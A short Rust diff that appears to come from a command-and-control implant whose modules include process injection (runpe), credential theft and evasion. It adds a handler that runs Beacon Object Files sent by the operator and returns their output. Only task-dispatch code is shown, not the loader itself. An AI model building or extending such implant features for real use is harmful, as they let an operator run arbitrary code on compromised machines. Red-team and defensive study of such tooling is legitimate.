@@ -25,6 +25,7 @@ mod runpe;
 mod embedded_config {
     include!(concat!(env!("OUT_DIR"), "/embedded.rs"));
 }
+mod bof;
 mod collect;
 mod cred;
 mod evasion;
@@ -925,6 +926,25 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
                     id: task.id,
                     status,
                     data,
+                },
+            )
+            .await
+        }
+        TaskBody::ExecBof { data, args } => {
+            // COFF object execution on the session thread (ABR-T034);
+            // output captured through the Beacon API callbacks.
+            let (status, out) = match bof::run(&data, &args) {
+                Ok(out) => (message::STATUS_OK, out),
+                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
+            };
+            send_result(
+                conn,
+                session,
+                profile,
+                TaskResult {
+                    id: task.id,
+                    status,
+                    data: out,
                 },
             )
             .await
